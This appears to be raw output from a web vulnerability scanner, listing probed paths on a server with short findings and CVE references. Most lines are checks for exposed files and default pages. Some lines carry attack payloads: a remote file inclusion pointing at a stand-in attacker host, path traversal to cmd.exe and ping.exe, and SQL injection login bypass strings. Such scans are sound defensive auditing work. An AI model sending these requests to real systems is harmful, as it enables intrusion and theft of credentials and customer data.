++ GET /idealbb/error.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /iisprotect/admin/SiteAdmin.ASP?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /include/customize.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /include/help.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /includes/footer.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /includes/header.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /infos/contact/index.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /infos/faq/index.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /infos/gen/index.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /infos/services/index.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /instaboard/index.cfm: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /intranet/browse.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /invitefriends.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ipchat.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ixmail_netattach.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /jsptest.jsp+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /kernel/class/delete.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /kernel/classes/ezrole.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ldap.search.php3?ldap_serv=nonsense%20: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /livredor/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /login.php3?reason=chpass2%20: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /mail/include.html: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /mail/settings.html: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /mambo/banners.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /manage/login.asp+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /members/ID.pm: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /members/ID.xbb: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /mod.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif/delete.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modif/ident.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modules/Forums/attachment.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modules/Search/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modules/WebChat/in.php+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modules/WebChat/out.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modules/WebChat/quit.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /modules/WebChat/users.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /moregroupware/modules/webmail2/inc/: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /msadc/Samples/SELECTOR/showcode.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /myguestBk/add1.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /myguestBk/admin/delEnt.asp?id=NEWSNUMBER|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /myguestBk/admin/index.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /newtopic.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /nphp/nphpd.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /oscommerce/default.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /parse_xml.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /php/gaestebuch/admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /php/php4ts.dll: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /pks/lookup: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /pm/lib.inc.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /produccart/pdacmin/login.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /productcart/database/EIPC.mdb: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /productcart/pc/Custva.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ProductCart/pc/msg.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /product_info.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /prometheus-all/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /protected/: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /protected/secret.html+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /protectedpage.php?uid=&#039;%20OR%20&#039;&#039;=&#039;&amp;pwd=&#039;%20OR%20&#039;&#039;=&#039;: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /protection.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /pt_config.inc: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /pvote/add.php?question=AmIgAy&amp;o1=yes&amp;o2=yeah&amp;o3=well..yeah&amp;o4=bad%20: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /pvote/del.php?pollorder=1%20: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /room/save_item.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /screen.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /scripts/tradecli.dll: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /scripts/tradecli.dll?template=nonexistfile?template=..\..\..\..\..\winnt\system32\cmd.exe?/c+dir: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /security/web_access.html: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /sendphoto.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /servers/link.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /shop/search.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /shop/show.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /Site/biztalkhttpreceive.dll: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /site_searcher.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /staticpages/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /status.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /supporter/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /supporter/tupdate.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /sw000.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /syslog.htm?%20: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /technote/print.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /tinymsg.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /topic/entete.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /topsitesdir/edit.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ttforum/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /tutos/file/file_new.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /tutos/file/file_select.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /typo3/dev/translations.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /cms/typo3/dev/translations.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /site/typo3/dev/translations.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /typo/typo3/dev/translations.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /typo3/typo3/dev/translations.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /url.jsp: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /useraction.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /utils/sprc.asp+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /vars.inc+: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /VBZooM/add-subject.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /wbboard/profile.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /wbboard/reply.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /webcalendar/login.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /webcalendar/view_m.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /webmail/lib/emailreader_execute_on_each_page.inc.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /web_app/WEB-INF/webapp.properties: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /XMBforum/buddy.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /XMBforum/member.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /x_stat_admin.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /yabbse/Reminder.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /yabbse/Sources/Packages.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /zentrack/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /_head.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ows-bin/oaskill.exe?abcde.exe: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /ows-bin/oasnetconf.exe?-l%20-s%20BlahBlah: This might be interesting: has been seen in web logs from an unknown scanner.
++ GET /database/: Database directory found.
++ GET /.wwwacl: Contains authorization information.
++ GET /.www_acl: Contains authorization information.
++ GET /.htpasswd: Contains authorization information.
++ GET /.access: Contains authorization information.
++ GET /.addressbook: PINE addressbook, may store sensitive e-mail address contact information and notes.
++ GET /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
++ GET /.forward: User home dir was found with a mail forward file. May reveal where the user's mail is being forwarded to.
++ GET /.history: A user's home directory may be set to the web root, the shell history was retrieved. This should not be accessible via the web.
++ GET /.htaccess: Contains configuration and/or authorization information.
++ GET /.lynx_cookies: User home dir found with LYNX cookie file. May reveal cookies received from arbitrary web sites.
++ GET /.passwd: Contains authorization information.
++ GET /.pinerc: User home dir found with a PINE rc file. May reveal system information, directories and more.
++ GET /.plan: User home dir with a .plan, a now mostly outdated file for delivering information via the finger protocol.
++ GET /.proclog: User home dir with a Procmail log file. May reveal user mail traffic, directories and more.
++ GET /.procmailrc: User home dir with a Procmail rc file. May reveal subdirectories, mail contacts and more.
++ GET /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
++ GET /.rhosts: A user's home directory may be set to the web root, a .rhosts file was retrieved. This should not be accessible via the web.
++ GET /.ssh: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ GET /jservdocs/: Default Apache JServ docs should be removed. See: CWE-552: 
++ GET /tomcat-docs/index.html: Default Apache Tomcat documentation found. See: CWE-552: 
++ GET /akopia/: Akopia is installed. See: CWE-552: 
++ GET /ojspdemos/basic/simple/usebean.jsp: Oracle 9i default JSP page found, may be vulnerable to XSS in any field. See: CWE-552: 
++ GET /php/index.php: Monkey Http Daemon default PHP file found. See: CWE-552: 
++ GET /servlet/FingerServlet: JRun default servlet found. All default code should be removed from servers. See: CWE-552: 
++ GET /servlet/HelloWorldServlet: JRun default servlet found. All default code should be removed from servers. See: CWE-552: 
++ GET /servlet/SnoopServlet: JRun, Netware Java Servlet Gateway, or WebSphere default servlet found. All default code should be removed from servers. See: CWE-552: 
++ GET /admcgi/contents.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /admcgi/scripts/Fpadmcgi.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /admisapi/fpadmin.htm: Default FrontPage file found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /bin/cfgwiz.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /bin/CGImail.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /bin/contents.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /bin/fpadmin.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /bin/fpremadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /bin/fpsrvadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /cgi-bin/cfgwiz.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /cgi-bin/CGImail.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /cgi-bin/contents.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /cgi-bin/fpadmin.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /cgi-bin/fpremadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /cgi-bin/fpsrvadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /scripts/cfgwiz.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /scripts/CGImail.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /scripts/contents.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /scripts/fpadmin.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /scripts/fpcount.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /scripts/fpremadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /scripts/fpsrvadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_private/: FrontPage directory found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_private/orders.htm: Default FrontPage file found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_private/register.htm: Default FrontPage file found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_private/registrations.txt: Default FrontPage file found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_private/_vti_cnf/: FrontPage directory found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/: FrontPage directory found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/admin.pl: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/cfgwiz.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/CGImail.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/contents.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/fpadmin.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/fpremadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/fpsrvadm.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_bin/_vti_cnf/: FrontPage directory found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_cnf/_vti_cnf/: FrontPage directory found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_log/_vti_cnf/: FrontPage directory found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_pvt/administrators.pwd: Default FrontPage file found, may be a password file. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /_vti_pvt/users.pwd: Default FrontPage file found, may be a password file. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage: 
++ GET /help/contents.htm: Default Netscape manual found. All default pages should be removed. See: CWE-552: 
++ GET /help/home.html: Default Netscape manual found. All default pages should be removed. See: CWE-552: 
++ GET /manual/ag/esperfrm.htm: Default Netscape manual found. All default pages should be removed. See: CWE-552: 
++ GET /nethome/: Netscape Enterprise Server default doc/manual directory. Reveals server path at bottom of page. See: CWE-552: 
++ GET /com/novell/gwmonitor/help/en/default.htm: Netware gateway monitor access documentation found. All default documentation should be removed from web servers. See: CWE-552: 
++ GET /com/novell/webaccess/help/en/default.htm: Netware web access documentation found. All default documentation should be removed from web servers. See: CWE-552: 
++ GET /com/novell/webpublisher/help/en/default.htm: Netware web publisher documentation found. All default documentation should be removed from web servers. See: CWE-552: 
++ GET /servlet/PrintServlet: Novell Netware default servlet found. All default code should be removed from the system. See: CWE-552: 
++ GET /servlet/sq1cdsn: Novell Netware default servlet found. All default code should be removed from the system. See: CWE-552: 
++ GET /servlet/sqlcdsn: Netware SQL connector found. All default code should be removed from web servers. See: CWE-552: 
++ GET /servlet/webpub: Netware Web Publisher found. All default code should be removed from web servers. See: CWE-552: 
++ GET /WebSphereSamples: Netware Webshere sample applications found. All default code should be removed from web servers. See: CWE-552: 
++ GET /index.html.ca: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.cz.iso8859-2: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.dk: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.ee: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.el: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.es: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.et: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.fr: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.he.iso8859-8: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.hr.iso8859-2: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.it: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.ja.iso2022-jp: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.ltz.utf8: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.lu.utf8: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.nl: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.nn: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.no: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.po.iso8859-2: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.pt: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.ru.cp-1251: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.ru.cp866: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.ru.iso-ru: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.ru.koi8-r: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.se: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.tw: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.tw.Big5: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /index.html.var: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information. See: CWE-552: 
++ GET /iissamples/sdk/asp/docs/codebrw2.asp: This is a default IIS script/file that should be removed. See: CVE-1999-0739,MS99-013: 
++ GET /iissamples/sdk/asp/docs/codebrws.asp: This is a default IIS script/file that should be removed. See: CVE-1999-0739,MS99-013: 
++ GET /iissamples/sdk/asp/docs/Winmsdp.exe: This is a default IIS script/file that should be removed. CVE-1999-0738. MS99-013. See: CVE-1999-1451,MS99-013: 
++ GET /a/: May be Kebi Web Mail administration menu. See: CWE-552: 
++ GET /basilix/: BasiliX webmail application. Default mysql database name is 'BASILIX' with password 'bsxpass'. See: CWE-552: 
++ GET /interchange/: Interchange chat is installed. Look for a high-numbered port like 20xx to find it running. See: CWE-552: 
++ GET /uploader.php: This script may allow arbitrary files to be uploaded to the remote server. See: OSVDB-3282: 
++ GET /general.chl+: Abyss allows hidden/protected files to be served if a + is added to the request. See: CVE-2002-1081: 
++ GET /srvstatus.chl+: Abyss allows hidden/protected files to be served if a + is added to the request. See: CVE-2002-1081: 
++ GET /mlog.html: Remote file read vulnerability 1999-0068. See: CVE-1999-0068: 
++ GET /mlog.phtml: Remote file read vulnerability 1999-0068. See: CVE-1999-0068: 
++ GET /php/mlog.html: Remote file read vulnerability 1999-0346. See: CVE-1999-0068: 
++ GET /php/mlog.phtml: Remote file read vulnerability 1999-0346. See: CVE-1999-0068: 
++ GET /XSQLConfig.xml: Oracle 9iAS configuration file found. See: BID-4290 CVE-2002-0568 https://securiteam.com/securitynews/5IP0B203PI/: 
++ GET /_private/form_results.htm: This file may contain information submitted by other web users via forms. See: CVE-1999-1052: 
++ GET /_private/form_results.html: This file may contain information submitted by other web users via forms. See: CVE-1999-1052: 
++ GET /scripts/tools/getdrvrs.exe: MS Jet database engine can be used to make DSNs, useful with an ODBC exploit and the RDS exploit (with msadcs.dll) which mail allow command execution. See: http://attrition.org/security/advisory/individual/rfp/rfp.9901.nt_odbc: 
++ GET /project/index.php?m=projects&user_cookie=1: dotProject 0.2.1.5 may allow admin login bypass by adding the user_cookie=1 to the URL. See: CVE-2002-1428: 
++ GET /site/eg/source.asp: This ASP (installed with Apache::ASP) allows attackers to upload files to the server. Upgrade to 1.95 or higher. See: CVE-2000-0628: 
++ GET /iissamples/exair/search/advsearch.asp: Scripts within the Exair package on IIS 4 can be used for a DoS against the server. See: CVE-1999-0449: 
++ GET /isqlplus: Oracle iSQL*Plus is installed. This may be vulnerable to a buffer overflow in the user ID field. See: CVE-2002-1264: 
++ GET /data/userlog/log.txt: Teekai's Tracking Online 1.0 log can be retrieved remotely. See: CVE-2002-2058: 
++ GET /userlog.php: Teekai's Tracking Online 1.0 log can be retrieved remotely. See: CVE-2002-2058: 
++ GET /ASP/cart/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /mcartfree/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /metacart/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /shop/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /shoponline/fpdb/shop.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /shopping/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web. See: CVE-2002-0943 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /ban.bak: Bannermatic versions 1-3 reveal sensitive information from unprotected files. These files should be protected. See: OSVDB-4237: 
++ GET /ban.dat: Bannermatic versions 1-3 reveal sensitive information from unprotected files. These files should be protected. See: OSVDB-4237: 
++ GET /ban.log: Bannermatic versions 1-3 reveal sensitive information from unprotected files. These files should be protected. See: OSVDB-4237: 
++ GET /admin/adminproc.asp: Xpede administration page may be available. The /admin directory should be protected. See: CVE-2002-0579: 
++ GET /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected. See: CVE-2002-0579: 
++ GET /utils/sprc.asp: Xpede page may allow SQL injection. See: CVE-2002-0579: 
++ GET /texis.exe/?-dump: Texis installation may reveal sensitive information. See: OSVDB-4314: 
++ GET /acart2_0/acart2_0.mdb: Alan Ward A-Cart 2.0 allows remote user to read customer database file which may contain usernames, passwords, credit cards and more. See: CVE-2006-2948: 
++ GET /acart2_0/admin/category.asp?catcode=': Alan Ward A-Cart 2.0 is vulnerable to a SQL inject attack. See: CVE-2004-1873: 
++ GET /Sites/Knowledge/Membership/Inspired/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: CVE-1999-0737,MS99-013: 
++ GET /Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: CVE-1999-0737,MS99-013: 
++ GET /Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: CVE-1999-0737,MS99-013: 
++ GET /Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: CVE-1999-0737,MS99-013: 
++ GET /Sites/Samples/Knowledge/Push/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: CVE-1999-0737,MS99-013: 
++ GET /Sites/Samples/Knowledge/Search/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: CVE-1999-0737,MS99-013: 
++ GET /SiteServer/Publishing/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. See: CVE-1999-0737,MS99-013: 
++ GET /siteserver/publishing/viewcode.asp?source=/default.asp: May be able to view source code using Site Server vulnerability. See: OSVDB-17671: 
++ GET /securelogin/1,2345,A,00.html: Vignette Story Server v4.1, 6, may disclose sensitive information via a buffer overflow. See: CVE-2002-0385: 
++ GET /sysuser/docmgr/ieedit.stm?url=../: Sambar default file may allow directory listings. See: https://seclists.org/fulldisclosure/2003/Mar/265: 
++ GET /sysuser/docmgr/iecreate.stm?template=../: Sambar default file may allow directory listings. See: https://seclists.org/fulldisclosure/2003/Mar/265: 
++ GET /catinfo: May be vulnerable to a buffer overflow. Request '/catinfo?' and add on 2048 of garbage to test. See: CVE-2001-0432: 
++ GET /soap/servlet/soaprouter: Oracle 9iAS SOAP components allow anonymous users to deploy applications by default. See: CVE-2001-1371: 
++ GET /MWS/HandleSearch.html?searchTarget=test&B1=Submit: MyWebServer 1.0.2 may be vulnerable to a buffer overflow (untested). Upgrade to a later version if 990b of searched data crashes the server. See: CVE-2002-1452: 
++ GET /.nsconfig: Contains authorization information. See: OSVDB-5709: 
++ GET /cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1: AnalogX SimpleServer:WWW HTTP vulnerability allows specially formatted strings to perform command execution. Upgrade to version 1.15 or higher. See: CVE-2001-1586: 
++ GET /dc/auth_data/auth_user_file.txt: The DCShop installation allows credit card numbers to be viewed remotely. See: CVE-2001-0821 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /dc/orders/orders.txt: The DCShop installation allows credit card numbers to be viewed remotely. See: CVE-2001-0821 https://packetstormsecurity.com/files/32406/xmas.txt.html: 
++ GET /cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html: HP Instant TopTools GoAhead WebServer hpnst.exe may be vulnerable to a DoS. See: CVE-2003-0169: 
++ GET /applist.asp: Citrix server may allow remote users to view applications installed without authenticating. See: CVE-2002-0502: 
++ GET /launch.asp?NFuse_Application=LookOut&NFuse_MIMEExtension=.ica: Citrix server may reveal sensitive information by accessing the 'advanced' tab on the login screen. See: CVE-2002-0301: 
++ GET /_layouts/alllibs.htm: Microsoft SharePoint Portal and Team Services vulnerable to NT or NTLM authentication bypass on Win2000 SP4 using IE 6.x. See: https://seclists.org/bugtraq/2003/Nov/226: 
